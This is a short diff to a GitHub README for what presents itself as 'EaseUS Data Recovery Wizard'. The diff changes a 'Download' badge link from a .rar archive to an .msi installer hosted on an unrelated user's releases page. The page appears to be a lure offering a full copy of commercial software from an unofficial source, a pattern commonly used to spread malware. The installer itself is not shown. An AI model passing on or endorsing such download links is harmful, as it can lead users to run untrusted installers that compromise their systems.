@@ -1,7 +1,7 @@
 <h1 align="center"><b>EaseUS Data Recovery Wizard</b></h1>
 
 <p align="center">
-  <a href="https://github.com/marowslern68-eng/EaseUS-Data-Recovery-Wizard/releases/download/Full/EaseUS-Data-Recovery-Wizard.rar" download>
+  <a href="https://github.com/marowslern68-eng/EaseUS-Data-Recovery-Wizard/releases/download/Full/EaseUSDataRecoveryWizardpath.msi" download>
     <img src="https://img.shields.io/badge/Download-blue?logo=download&logoColor=white&style=for-the-badge" alt="Download"/>
   </a>
 </p>
